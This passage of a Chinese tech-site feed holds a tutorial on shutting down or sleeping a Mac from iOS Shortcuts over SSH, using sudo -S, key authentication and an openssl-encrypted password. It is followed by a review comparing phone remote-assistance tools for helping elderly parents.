的电源。例如在上床后，需要关闭电脑电源，或者是使电脑熄灭屏幕。其实，在少数派上早有文章可以实现这些功能，但是配置较为复杂。例如下面的这两篇文章。</p>\n<ul>\n<li><a href=\"https://sspai.com/post/35242\" target=\"_blank\">《把你的 iOS 设备变成控制 Mac 的「遥控器」》</a></li>\n<li><a href=\"https://sspai.com/post/35799\" target=\"_blank\">《无需第三方 App，同样可以把你的 iOS 设备变成 Mac「遥控器」》</a></li>\n</ul>\n<p>但是本文仅使用捷径，就可以很简单地实现这些功能。接下来就随着文章，来看看如何使用捷径，控制电脑执行重启、注销和关机等操作。读完本文后，可以学到以下知识点：</p>\n<ol>\n<li>如何开启远程登录 Mac</li>\n<li>捷径 SSH 模块的使用</li>\n<li>SSH 公钥的使用方法</li>\n<li>RSA 加密的实际运用</li>\n</ol>\n<h3>Mac 配置</h3>\n<p>为了实现局域网内的控制，首先需要开启 macOS 的 ssh 访问功能。前往「系统偏好设置」&gt;「共享」，勾选「远程登录」，打开 ssh 远程登录功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/58210f4994575209002d8d63a342761b\"></figure><p>点击上方的「编辑...」，编辑局域网内电脑的名称，例如此处的 james，最后点击「好」保存设置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/d05f67f35c2db93901860c4110b0e79b\"></figure><p>此时，如果要在局域网内访问电脑，只需要访问 james.local 即可。这样做的好处是，即使电脑切换到其他网络下，Mac 在局域网内 IP 地址发生改变，也依旧可以通过主机名访问。</p>\n<p>最后，可以通过 ssh 命令确认开启状态。打开终端，输入「ssh 主机名」连接本机，例如图中的「ssh james.local」，如果正常就会询问密钥指纹是否正确。反之，如果 ssh 服务没有正常工作，就会像第二条命令一样显示「Connection refused」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/f6582c07bd53574c028feb2d5941e11e\"></figure><h3>捷径构建</h3>\n<p>接下来，就要使用构建捷径来实现功能。新建捷径，搜索 ssh 模块，选择「通过 SSH 运行脚本」添加模块，可以看到该模块要求输入以下参数：主机、用户、认证方式、密码和命令。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/1e8dd1bfd2672a2e2c1bd4b50a8e241d\"></figure><p>在上一步，已经设置好的主机名即为主机参数。用户和密码对应着电脑的用户密码，不必多说。最重要的是该执行什么命令。所以特在此整理了一份命令速查表，读者可以根据需要复制相应的命令。</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td>关机</td>\n<td>shutdown -h now</td>\n</tr>\n<tr>\n<td>重启</td>\n<td>shutdown -r now</td>\n</tr>\n<tr>\n<td>常亮</td>\n<td>pmset noidle</td>\n</tr>\n<tr>\n<td>电脑休眠</td>\n<td>pmset sleepnow</td>\n</tr>\n<tr>\n<td>屏幕休眠</td>\n<td>pmset displaysleepnow</td>\n</tr>\n<tr>\n<td>唤醒电脑</td>\n<td>wakeonlan 网卡地址</td>\n</tr>\n</tbody></table></figure><p>这个表格有两个地方需要补充说明，首先是「唤醒电脑」功能。该功能需要在局域网内有一台其他设备，例如树莓派。捷径实际上是发送 wakeonlan 给树莓派。树莓派再通过 WOL 协议唤醒 Mac，而不是直接将命令发给 Mac，这一点请切记。</p>\n<p>其次，还要注意的是 shutdown 命令属于系统级命令，需要超级用户权限才能执行。如果在终端里直接执行该命令，会有如下的报错，而且也无法关闭电脑。因为目前登录的是用户，而不是超级用户。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/32d5c1564272ab8969f02eb071da532e\"></figure><p>为了能够正常执行该命令，需要在前面加上 sudo，以此表示使用超级用户权限执行命令。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/bc117326d5e5d47f54966eeec45303bc\"></figure><p>在命令前面添加 sudo 之后，会要求输入用户的密码进行确认，密码输入正确之后即可关机。但是这时候要注意到一个问题，捷径是没有办法与电脑交互的，更别提输入密码了。sudo 命令的作者 Robert Coggeshall 显然也考虑到了这个问题，所以提供了一个 -S 的参数，该参数可以接收管道传来的字符串，作为密码进行确认，无需手动输入密码。</p>\n<p>所以加上 -S 参数后的关机命令是如下，此处的「密码」需要更换成读者的电脑密码。</p>\n<pre class=\"language-\"><code>echo 密码|sudo -S shutdown -h now\n</code></pre>\n<p>命令构建完成之后，就可以开始填写捷径参数了。如下图所示，可以看出用户名是 james，密码是 123456（当然是假的了）。保存该捷径，命名为关机，通过喊一句「heySiri, 关机」即可关闭电脑电源。当然，这里的关机只是一个演示功能，对于 macOS 用户来说，更常见的电源操作应该是：pmset sleepnow（电脑休眠）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/742811a42daf5923f5229a394a8adb60\"></figure><p>但是细心的读者可能也注意到了，此处的密码是明文保存，非常不安全。此处需要特别说明的是，密码区域的 123456 之所以是明文，这是因为作者使用的是 iOS 15 测试版，在 iOS 14 上它应该是 6 个小黑点。但是即使是这样，命令区域输入的密码依旧是不安全的明文，安全性有待提高。所以在实现基本功能之后，就可以来完善它的安全性了。</p>\n<h3>更换密钥验证</h3>\n<p>在上一步，作者使用密码作为验证访问 Mac。但是这样做，轻则暴露密码长度，重则直接暴露密码，所以可以考虑使用密钥验证。点击「认证」选择「SSH 密钥」，捷径就会生成 SSH 密钥以供使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/15654f8895fb0d7b5b13876dbe9bcef1\"></figure><p>从上图右边可以看出，这个密钥的类型是 ed25519。如果想要其他类型的密钥，可以点击下面的「生成新密钥」进行选择，作者在此处选择了 2048 位的 RSA 密钥。读者可以根据自己的偏好选择，无论是 ed25519 还是 RSA 方法都是一样的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/3e5d94fb75243feecbae974d23898f3a\"></figure><p>生成 SSH 密钥后，就要在电脑上配置密钥。点击「共享公共密钥」，将密钥文本导出，将密钥发送到电脑上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/391629da7e0a357ee60ac7316ea139a5\"></figure><p>通过 Finder 的快捷键 shift+command+G，前往 ~/.ssh 文件夹。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/8f73b260f2f7058dcef5b7b42e241cdd\"></figure><p>新建名为 authorized_keys 的文件，粘贴密钥，将文件保存到 ~/.ssh 路径之下。这样配置之后，就可以无需密码，直接通过公钥访问 Mac。此处的图形界面操作是为新手考虑而写，有 命令行基础的用户，请直接使用下面这条命令追加公钥。 </p>\n<p> </p>\n<pre class=\"language-null\"><code>pbpaste &gt;&gt; ~/.ssh/authorized_keys</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/ddc1020d38d2db905320fa4c3a391bce\"></figure><h3>密码加密传输</h3>\n<p>在解决完了密钥验证问题之后，还剩下命令里的明文密码要解决。这时候可以请出大名鼎鼎的 RSA 非对称加密算法了。非对称加密需要公钥，私钥一对。顾名思义，公钥是可以公开传播的，而私钥就是要私藏好的。公钥可以用于加密，却无法解密，只有使用私钥才可以解密。所以只要妥善保管私钥，那么整个加密体系就是安全的。</p>\n<p>接下来，就来看看 RSA 加密的实际应用。首先需要生成一对公私钥，它将被用以加解密文本，命令如下：</p>\n<pre class=\"language-\"><code># 生成私钥\nopenssl genrsa -out ~/.ssh/PrivateKey.pem 2048\n\n# 生成公钥\nopenssl rsa -in ~/.ssh/PrivateKey.pem -pubout &gt; ~/.ssh/PublicKey.pub</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/eb196e086c705d6cc9feb971d4940458.png\"></figure><p>将密码进行加密并编码，echo 后面跟随的内容即为密码，例如此处的 123456，请将此处的 123456 替换为读者自己的电脑密码。</p>\n<pre class=\"language-\"><code>➜ echo 123456|openssl rsautl -encrypt -pubin -inkey ~/.ssh/PublicKey.pub\ny��ڊ��_���Ɲ�Ea�� P�h�6��&gt;\"C�傣�E�!�+���\n                                       ��[�B�����7��'3�P�        u#D*�\n&amp;���A߶�7ږ���Y߇{�^}�I�8*��ft�뱱ރ�z��+��v=ജK�2������i� ���VFש�</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/8a0d83f83a3039878cba4686c2a28618\"></figure><p>但是可以看出，经过加密之后的 123456 变成了一串乱码，这是因为 RSA 加密的结果是二进制流，而非普通的可打印字符，那么这还怎么使用？这时候，就可以请出 base64 编码了，它可以将任何信息流都转换为特定字符集内的编码。</p>\n<pre class=\"language-\"><code>➜ echo 123456|openssl rsautl -encrypt -pubin -inkey ~/.ssh/PublicKey.pub|base64\nO7O6emCBxJ6jG0elhtnFjHwTkRl8mofO+UkfRFzcL5casGTwYAIM2sC1grXlMkyL21lT6OkAtOEC\nl9hHHbshfgZHrMRFlCvOp0C3NdiQga50Jau14Hx6oNcahxtXLoS8x1dH5sPpypLVOBFk1OaJ9daF\nHWGX/eI7S6GBCOguOd0fuzimI66dUXcQFmOvH8Ou2veoF3LrjSffE2lLCQCt7k3/YCznonsUu6lv\nDS+E9G4cSSrXQrcf/HsITsWLa3TpwF/iLL3Uh1NaOY9M998vhB/u/DTwi8OJf7ygXVu9YdIthe4n\n0t/ACABYRf9yOGG1vnT8LXqvPFFHVynGAbwP2Q==</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/87fcd81edf236ab9e1a2bdfda3847605\"></figure><p>此处的 O7O...Q== 即为密码加密编码之后的结果。如果需要验证是否正确，可以进行解密验证。可以看出，成功解密出了 123456 的密码明文。</p>\n<pre class=\"language-\"><code>➜ echo 'O7O6emCBxJ6jG0elhtnFjHwTkRl8mofO+UkfRFzcL5casGTwYAIM2sC1grXlMkyL21lT6OkAtOEC\nl9hHHbshfgZHrMRFlCvOp0C3NdiQga50Jau14Hx6oNcahxtXLoS8x1dH5sPpypLVOBFk1OaJ9daF\nHWGX/eI7S6GBCOguOd0fuzimI66dUXcQFmOvH8Ou2veoF3LrjSffE2lLCQCt7k3/YCznonsUu6lv\nDS+E9G4cSSrXQrcf/HsITsWLa3TpwF/iLL3Uh1NaOY9M998vhB/u/DTwi8OJf7ygXVu9YdIthe4n\n0t/ACABYRf9yOGG1vnT8LXqvPFFHVynGAbwP2Q=='|base64 -d|openssl rsautl -decrypt -inkey ~/.ssh/PrivateKey.pem\n123456\n</code></pre>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/f9c6dce114d35ec8c766ecbd1e93109f\"></figure><p>接下来，只需要把原来命令里的 echo 123456 替换成加密后的 base64，即可实现密码的加密。替换之后的命令如下所示。</p>\n<pre class=\"language-\"><code>echo 'THdWo9IwCBLk65DPWZ8ZnC8+8eoogVcWAlUcViSM3DwKftC2L5KhZ5yBkN5EKIhNt0ogEsZxD+zF\ntSiiHNQfA0FjLME/HxOtvLlObmjH6Xkhztkc+Q2Fm+f3FbhIP5YiK2hnWGD+8kNDIYrqhVy0NeRH\n8L8ga36YwQbj/jVoy6H66qPbKy+/9DyGNVKUbrKpEoNrj5MULUL8h+e3bY7NM5JhYNvN3OVkmUn4\nIfRsn8mXQjgfftksL0fmNq52O/4bsTjDFaxuVfC9np7u4F9ujWMYnefiUDxdwGTb0yCR6+8uoJsb\nHVSNwSNUB80OcdJv5AITYCpX9Eifz9GHb/kiXA=='|base64 -d|openssl rsautl -decrypt -inkey ~/.ssh/PrivateKey.pem |sudo -S shutdown -r now</code></pre>\n<p>该命令由 4 个小命令组成，由 |（管道符）进行连接。首先使用 echo 输出 base64 编码，通过 base64 -d 解码出二进制流，传递给 openssl 命令解密出明文。最后将明文作为参数，传递给 sudo 命令作为密码使用，执行立即关机的命令。</p>\n<h3>效果演示</h3> <p> </p>\n<h3>文章总结</h3>\n<p>本文以远程关机为例，教学如何使用捷径通过 SSH 对电脑电源进行操作。在作者的日常生活中，其实更多的是配合其他模块共同使用，作者的捷径里有一个名为「离开模式」的捷径，它的功能是关闭屏幕挂灯和电脑休眠。在作者需要出门的时候，手上在整理出门要带的东西，嘴上就可以直接喊：「heySiri，离开模式」。东西收拾好之后，也就可以直接离开了，免去了手动休眠和关闭挂灯的步骤。当然这还是比较简化的描述，以后可能会专门在写一篇文章，来介绍这个捷径的制作过程。</p>\n<p>另外，SSH 能够做到的绝不止本文所提的电源控制，还可以是音量的加减，打开网页，打开软件等。本文以电源控制为例，只是举了一个常用的场景。本文抛砖引玉，希望读者能够结合自己的生活场景举一反三，做出一些更适合自己的捷径。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/6ccc688d9f83d5a93d05eccae4415c41\"></figure><h3>关联阅读</h3>\n<p><a href=\"https://sspai.com/post/61379\" target=\"_blank\">通过 pmset 工具管理 masOS 睡眠，让你的 Mac 睡得更好</a></p>\n<p><a href=\"https://sspai.com/post/43546\" target=\"_blank\">Mac 上隐藏了许多实用的功能，只有这样才能打开</a></p>\n<p><a href=\"https://sspai.com/post/39524\" target=\"_blank\">歪用 HomeKit 让 Siri 更「听话」</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68101"},{"title":"爸妈的手机又出问题了？这些方案或许真的能够帮到你","date":"2021-08-09 03:30:02","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>系统迭代、应用更新，新功能的到来既能改善体验，但同时，或许抬高了老一辈的手机用户的使用难度，而长辈们要么不使用新功能，要么选择向身边的，亦或是通过电话向远方的年青人求助。但「求助」一词，说实话令人感觉没那么舒服。</p>\n<p>当长辈、朋友的手机出现问题时，除了微信视频通话、手绘说明书，还有没有更好的方法可以帮助到他们呢？</p>\n<p>2014 年，EMUI 3 开始公测，远程协助功能上线；2015 年，Smartisan OS v2.5 提供「远程协助」功能，用户可选择发起帮助或帮助他人。随后魅族、小米、苹果、向日葵、TeamViewer 等厂商也跟进了这一功能，比如小米通话、魅族远程协助，和 FaceTime 屏幕共享。</p>\n<p>下文中，我将对华为、小米、苹果、TeamViewer、AnyDesk、向日葵的远程协助功能进行体验与比较。评测标准如下：</p>\n<ul>\n<li>远程协助入口：请求帮助 / 帮助他人需要点击的步数</li>\n<li>使用流畅性：过渡动画、视频播放、点击响应速度、屏幕延迟</li>\n<li>内置功能及附加功能：语音通话、涂鸦、隐私保护</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/b3e2fdcafc8d655d9ab577aeb72c189a.png\"><figcaption>各家远程协助工具功能比较</figcaption></figure><h2>华为：亲情关怀</h2>\n<blockquote>\n<p>测试网络：移动宽带 + 移动 5G</p>\n<p>底层：Huawei Video Engine + Huawei Audio Engine + Smack.Jingle.Old</p>\n</blockquote>\n<p>华为的「亲情关怀」从 EMUI 3 便内置在系统中，目前支持 EMUI 5、8 ~ 11、Magic UI、Harmony OS 的所有机型，但亲情关怀只对自家生态开放，其它机型或其它品牌的手机使用会出现闪退、不兼容 HMS Core 等问题。</p>\n<h3>体验结果</h3>\n<ul>\n<li>入口深度：独立应用，可通过通讯录导入至亲友团</li>\n<li>流畅性：存在系统动画掉帧的现象，视频流畅播放，流畅性总体而言比较出色</li>\n<li>内置功能：协助方无法听到求助方的系统声音，支持语音通话、涂鸦，密码输入时能够智能黑屏</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/72c624398b022f8f35d962a25ad6deeb\"><figcaption>华为亲情关怀</figcaption></figure><p>打开「亲情关怀」，登录华为账号，默认只允许来自亲友团或最近联系人的协助请求，因此需事先添加为联系人。点击下方的「亲友团」，通过华为账号或通过通讯录导入，添加协助方或被协助方为亲友团。添加完成后，点击亲友团中的联系人，这一步可以选择「请求帮助」或「提供帮助」。</p>\n<p>当双方建立连接后，被协助方屏幕上方会显示「您的手机正被远程协助中」。协助方能够通过涂鸦工具、麦克风进行交流，更直观地向被协助者展示点击哪里、该怎么滑动。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/33c12dd12ed8fa6df1ff5f31e5367688\"><figcaption>华为亲情关怀</figcaption></figure><p>对于密码输入的场景，亲情关怀会将协助方一侧的屏幕黑屏，输入完成自动恢复。令人不解的是，亲情关怀全局屏蔽协助方截屏、录屏、投屏操作，截屏内容无法看到被协助方的屏幕。在体验过程中，发现系统动画会存在掉帧现象，视频都能比较流畅的观看，但总体流畅，不会出现长时间无响应的情况。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/5c5d1eda2bdfba36c89f4e0c59e67a96.gif\"><figcaption>亲情关怀：流畅性</figcaption></figure><h2>小米：小米通话</h2>\n<blockquote>\n<p>测试网络：移动宽带 + 联通 4G、移动宽带 + 移动宽带</p>\n<p>底层：腾讯云移动直播 SDK</p>\n</blockquote>\n<p>MIUI 的远程协助功能是借助系统组件 + 应用的方式运行，需要前往应用商店下载「小米通话」，其前身为「米聊」与「小米视频通话」。其次小米通话的协助功能不依靠系统组件，用户可以在任一 Android 设备上安装小米通话，登录小米账号后即可为他人提供帮助。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/6e2a08619239ea0c745f7041ef9da9cc.png\"><figcaption>小米通话</figcaption></figure><h3>体验结果</h3>\n<ul>\n<li>入口深度：独立应用，只能通过设备号进行呼叫、连接</li>\n<li>流畅性：系统动画掉帧比较严重，会出现长时间无响应的问题</li>\n<li>内置功能：协助方无法听到求助方的系统声音，远程协助时无法使用扬声器外放，无涂鸦功能，密码输入时能够智能黑屏</li>\n</ul>\n<p>打开小米通话，登录小米账号，拨打另一位用户的设备号，接通后，求助方点击左上角的「远程协助」，此时协助方需要输入求助方屏幕上展示的 6 位协助码，通过后方可进行远程协助。</p>\n<p>体验中发现，尽管协助前双方已开启免提状态，但在接入远程协助后，协助方与求助方都只能通过听筒进行对话，亦或是使用耳机。即便是双方处于网络良好的环境，协助方看到的内容也比较卡顿，容易让人血压上升。在不同设备分别使用移动宽带、联通 4G 进行测试，两次均出现出现协助方屏幕无响应的情况，唉。</p>\n<p>针对密码输入的场景，小米通话会暂停协助方一侧的屏幕内容显示，避免隐私内容泄露。求助方可以点击屏幕上的「停止协助」按钮，暂停远程协助。考虑到这个延迟，要不 …… 小米把小米通话拖出去毙了吧。</p>\n<h2>苹果：FaceTime 屏幕共享</h2>\n<blockquote>\n<p>测试网络：移动宽带 + 电信宽带</p>\n<p>系统版本：iOS 15 Public Beta 4、iPad OS 15 Public Beta 4</p>\n</blockquote>\n<p>2010 年，Apple Support 上线屏幕共享功能，用户在与客服联系时，客服可通过屏幕共享对用户进行指导。但这一功能一直未下放给用户，在 WWDC 2021，苹果发布了 FaceTime SharePlay，其中便包含「屏幕共享」功能。其优势在于基于系统应用达成该功能，将这一功能与 FaceTime 通话相结合。</p>\n<h3>体验结果</h3>\n<ul>\n<li>入口深度：系统内置应用，拨打 FaceTime 视频电话后可使用</li>\n<li>流畅性：系统动画、视频播放都较流畅</li>\n<li>内置功能：观看方能够听到共享方的系统声音，只对默认键盘的密码输入场景有隐私保护</li>\n</ul>\n<p>拨通 FaceTime 通话后，共享方点击菜单的「共享我的屏幕」后，观看方的屏幕则会显示共享方的屏幕内容，同时双方可以通过语音进行沟通。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/ba5515a10bdfe512ee9fe4469bf37dbe\"><figcaption>FaceTime</figcaption></figure><p>与小米通话的远程协助相比，FaceTime 屏幕共享功能会流畅许多，在双方网络条件都不错的情况下，能够共同观影，且共享方的音量调整不会影响观看方。假如应用支持 SharePlay，则可以唤起「同播共享」功能，比如 Apple Music、Apple TV 等，但前提是双方都有订阅流媒体服务，且 Apple ID 处于同一区域。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/af94358618550cc089195c5aad32cbb9.gif\"><figcaption>FaceTime 屏幕共享：流畅性</figcaption></figure><p>因为 FaceTime 屏幕共享这一功能更注重「让对方和你一起看你的屏幕」，而非协助，因此未提供涂鸦功能。此外，FaceTime 屏幕共享识别到共享方需要通过键盘输入密码时，观看方的屏幕是无法显示共享方的键盘输入内容，但经过测试，微信、QQ、京东、支付宝由于采用了自制的「安全键盘」，输入支付密码时均能看到键盘按下的动画效果，云闪付无动画效果，买单吧则禁止输入。</p>\n<p>FaceTime SharePlay 功能只能在 iOS 15、iPadOS 15、macOS Monterey 及其以上版本中使用，对于老旧设备、不愿升级至最新版本的用户而言不太友好。</p>\n<h2>TeamViewer、AnyDesk、向日葵远程控制</h2>\n<blockquote><p>测试网络：移动宽带 + 移动宽带</p></blockquote>\n<p>TeamViewer、AnyDesk、向日葵这三款工具更注重远程控制，除了通过手机客户端，三款工具均提供了电脑客户端。如果设置有无人值守访问密码，便可通过控制端直接连接受控端，无需手动点击同意访问，但需保证应用存活于后台、辅助功能打开的状态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/638302a1fa220bcc38016627897d1866.png\"><figcaption>TeamViewer</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/33a9dd3bb294ac76fa651dc900790a28.png\"><figcaption>AnyDesk</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/ca8602878ee52976263965d26a8b1815.png\"><figcaption>向日葵远程控制</figcaption></figure><p>TeamViewer、AnyDesk、向日葵等第三方应用借助辅助功能实现免 Root 控制手机，但重启、退出应用程序会关闭辅助服务的权限，需手动重新打开。</p>\n<blockquote><p>Android Framework 为应用开发者提供 Accessibility Service 接口，其帮助用户更好地使用应用程序，如 TalkBack 功能。而在国内，这一功能更多地被用于自动化操作、免 Root 安装 App、自动抢红包、远程协助，但也有部分开发者滥用这一接口，详细内容可阅读 360 烽火实验室的文章《<a href=\"https://blogs.360.cn/post/research_of_accessibility.html\" target=\"_blank\">Android Accessibility 安全性研究报告</a>》。</p></blockquote>\n<h3>体验结果</h3>\n<ul>\n<li>入口深度：独立应用，需通过设备 ID 与验证码登录</li>\n<li>流畅性：系统动画、视频播放都较流畅</li>\n<li>内置功能：协助方无法听到求助方的系统声音，只对默认键盘的密码输入场景有隐私保护，只有 TeamViewer 有涂鸦功能，向日葵提供按键菜单</li>\n</ul>\n<p>总体来说，三家体验比较流畅，向日葵的流畅性与 TeamViewer、AnyDesk 相比稍差，桌面翻页动画中会有较大的延迟，出现有点击、滑动操作无响应的情况。而 TeamViewer、AnyDesk 的服务器在国外，会有不稳定的情况出现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/073a2c8c7251cc4c22026edbdf71dcee.gif\"><figcaption>TeamViewer、AnyDesk、向日葵远程控制：流畅性</figcaption></figure><p>TeamViewer 在协助过程中会展示点击、滑动操作，更直观地展示协助方的操作。AnyDesk、向日葵均无提供涂鸦工具。对于密码输入的隐私场景，系统内置的密码安全键盘能够自动屏蔽观看方一侧的屏幕，但微信支付的密码键盘则无法屏蔽，对方能够观看到支付密码的输入。</p>\n<p>除了 AnyDesk 外，如只使用单台设备进行协助，TeamViewer 可使用个人免费版，而向日葵只提供 1 天试用期，试用期过后如需继续使用，需按主机购买向日葵的移动授权，单个主机 1 年 78 元授权费。</p>\n<h2>其它</h2>\n<p>由于手上与身边朋友暂无魅族、OPPO、vivo 与锤子这四款机型，暂时无法对其进行体验。如果有使用过它们四家的远程协助功能的读者，可以在文章评论区中谈谈使用体验，十分感谢。这四家品牌的手机均提供了远程协助功能，方便用户帮助他人或获得他人的帮助，打开方式如下：</p>\n<h3>Smartisan、坚果</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/cf22df086442c1f000be12f1f7937f7c.png\"><figcaption>Smartisan 远程协助（图片来源：锤子科技论坛）</figcaption></figure><ul>\n<li>使用教程：<a href=\"https://bbs.smartisan.com/thread-241094-1-1.html\" target=\"_blank\">[教程] Smartisan OS 远程协助首次使用教程</a>\n</li>\n<li>打开「远程协助」，求助方点击「我要求助」，协助方点击「帮助他人」</li>\n<li>等待帮助请求或对方接受帮助</li>\n<li>连接后即可进行远程协助，过程中可通过涂鸦与麦克风进行交流。</li>\n</ul>\n<h3>OPPO</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/3472d5a29ab5f2e79cb144fbdb259999.png\"><figcaption>OPPO 远程协助（图片来源：OPPO 官方微博）</figcaption></figure><ul>\n<li>使用教程：<a href=\"https://weibo.com/1710173801/JBVZK5S8g\" target=\"_blank\">OPPO Reno5 系列的 N 种隐藏玩法 —— 屏幕共享篇</a>、<a href=\"https://support.oppo.com/cn/service-news/service-news-detail/?n=OPPO%20%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1\" target=\"_blank\">OPPO 远程服务</a>\n</li>\n<li>打开「设置 - 连接与共享」，点击「屏幕共享 - 发起共享」</li>\n<li>输入对方手机号后等待对方接受邀请</li>\n<li>如需进行远程协助，则需在接入屏幕共享后，点击浮窗「共享中 - 授权对方操作」，协助过程中可以通过麦克风交流。</li>\n</ul>\n<h3>vivo</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/7c564a5b6b5a41528fbfab628983989d.png\"><figcaption>vivo 远程协助（图片来源：vivo 客服官方微博）</figcaption></figure><ul>\n<li>使用教程：<a href=\"https://weibo.com/2358294640/Jo7AytQq0\" target=\"_blank\">vivo 远程协助</a>\n</li>\n<li>协助方、求助方打开「vivo 官网 - 我的」，点击「我的服务 - 更多 - 远程协助」</li>\n<li>求助方点击「需要帮助」，协助方点击「协助他人」，此时协助方需输入求助方屏幕上的 7 位操作码</li>\n<li>协助过程中，可通过手指、画笔、聊天进行交流</li>\n</ul>\n<h3>魅族</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/53bf227055aa1e85adc2fe2c6a8790f9.jpg\"><figcaption>Flyme 家庭守护（图片来源：Flyme 官方微博）</figcaption></figure><ul>\n<li>使用教程：<a href=\"https://weibo.com/3230122083/KekNxnU5K\" target=\"_blank\">Flyme 家庭守护</a>\n</li>\n<li>打开「设置 - SOS 紧急求助」</li>\n<li>点击「家庭守护」，绑定家人</li>\n<li>点击「远程协助」，待双方同意后即可进入远程协助。</li>\n<li>过程中可以通过涂鸦、麦克风进行交流。</li>\n</ul>\n<h3>其它工具</h3>\n<p>除了上文提到的几款系统内置、第三方远程协助工具，近年手机厂商开始关注家庭领域 —— 家庭云空间、手机使用情况、远程定位、手机安全防护，比如<a href=\"https://mp.weixin.qq.com/s/rzrfaOmCYZ5ggajYwlhjug\" target=\"_blank\">小米「风筝守护」</a>、<a href=\"https://sspai.com/post/55302\" target=\"_blank\">OPPO「远程守护」</a>、<a href=\"https://consumer.huawei.com/cn/emui10-1/tips/fitness-health-list/article6/\" target=\"_blank\">华为「健康使用手机」</a>，功能虽小，却能让远方的游子心安。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/842367ddea23e3b30979871cc25a4503.png\"><figcaption>小米风筝守护</figcaption></figure><h2>尾言</h2>\n<p>在过去的两年时间，即使我人不在家中，远程协助让我能够帮助我爸查询机动车是否有违章记录，教会我爸怎么用淘宝下单买东西，教会我妈如何使用下厨房来看菜谱，如何关闭微信中弹出的小程序广告。即便相隔千里，通过远程协助，通过微信语音，我们也能为父母解决他们遇到的问题。</p>\n<p>小时候，父母们养大我们这块「叉烧」，而如今，当老一辈人也渴望感受下年青人的世界，体验丰富多彩的生活时，我们可以为他们做些什么呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/b317faa615e71b366b35423d8552cc6d.png\"><figcaption>图片来源：<a href=\"https://www.bilibili.com/video/av3476004\" target=\"_blank\">Smartisan OS 远程协助功能之情感篇</a></figcaption></figure><p>在帮父母选购手机时，不妨看看手机里有没有远程协助功能，不妨帮爸妈的手机关闭掉可以关闭的通知推送广告、弹窗广告，开启手机管家的自动清理垃圾功能，教会他们使用一键求助功能，他们需要的不只是大字体、大声音。</p>\n<p>幸运的是，2020 年年末，我国工信部发布了《<a href=\"http://www.gov.cn/zhengce/content/2020-11/24/content_5563804.htm\" target=\"_blank\">关于切实解决老年人运用智能技术困难的实施方案</a>》，希冀能增进老年人在信息化发展中有更多的获得感、幸福感与安全感，能够感受到「科技的温度」。 </p>\n<h2>相关阅读</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/62215\" 